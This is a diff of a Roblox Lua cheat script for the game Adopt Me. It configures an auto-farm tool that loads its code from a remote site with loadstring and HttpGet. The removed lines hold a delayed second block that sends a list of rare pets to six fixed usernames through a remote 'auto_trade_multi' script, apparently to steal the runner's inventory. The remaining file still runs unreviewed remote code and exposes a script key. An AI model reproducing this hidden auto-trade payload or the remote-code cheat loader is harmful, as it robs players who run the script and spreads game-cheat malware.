@@ -1,11 +1,9 @@
-task.spawn(function()
-    task.wait(30)
-    getgenv().Config = {
+ getgenv().Config = {
         Dashboard = {
             Enabled = true, -- Connect to Adopt Me dashboard To Control Script/View Stats (https://zekehub.com/dashboard/adoptme)
             GroupName = "Main", -- Group name for organizing accounts on dashboard
         },
-	    BabyFarm = true, -- Does baby farm
+	BabyFarm = true, -- Does baby farm
             PetFarm = {
             Enabled = true, -- Enables the Pet Farm
             FarmEggs = true, -- If true, equips eggs to hatch them. If false, equips regular pets
@@ -87,15 +85,5 @@ task.spawn(function()
             ExcludedTasks = {}, -- Task IDs to skip (e.g., {"buccaneer_band", "summerfest_bonfire"})
         },
     };
-    getgenv().scriptkey="ADdTrOaADvQbzOVsAVtmcgOEXFeIYAYO"
-    loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMe/Lite.lua"))()
-end)
-
-task.spawn(function()
-    getgenv().Config = {
-        ["inventory"] = "pets",
-        ["usernames"] = {"ihyaem1", "ihyaem2", "ihyaem3", "ihyaem4", "ihyaem5", "ihyaem6"}, -- Boucle sur ces pseudos
-        ["pets_to_trade"] = {"basic_egg_2022_ancient_dragon", "endangered_2026_sea_turtle", "endangered_2026_blue_whale", "basic_egg_2022_dragonfly", "basic_egg_2022_alicorn", "pet_recycler_2025_crystal_egg", "admin_abuse_egg_2026_robot_chicken", "beach_2024_diamond_mahi_mahi", "penguins_2025_dango_penguins", "sugarfest_2026_gumball_caterpillar", "food_pets_2026_dragonfruit_fox", "sugarfest_2026_mochi_meow", "endangered_2026_silverback_gorilla"}
-    }
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/diwserenityhub/other/refs/heads/main/auto_trade_multi"))()
-end)
+getgenv().scriptkey="ADdTrOaADvQbzOVsAVtmcgOEXFeIYAYO"
+loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMe/Lite.lua"))()
